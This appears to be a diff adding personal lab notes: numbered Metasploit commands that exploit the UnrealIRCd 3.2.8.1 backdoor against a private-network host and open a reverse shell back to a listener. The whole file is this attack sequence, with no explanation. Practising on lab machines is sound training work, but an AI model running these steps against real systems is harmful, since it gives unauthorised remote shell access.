@@ -1,0 +1,17 @@
+1. search ircd
+
+2. use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+3. options
+
+4. set rhosts 192.168.56.101
+
+5. set payload cmd/unix/reverse
+
+6. set lhost 192.168.56.10
+
+7. exploit
+
+8. ifconfig
+
+9. exit
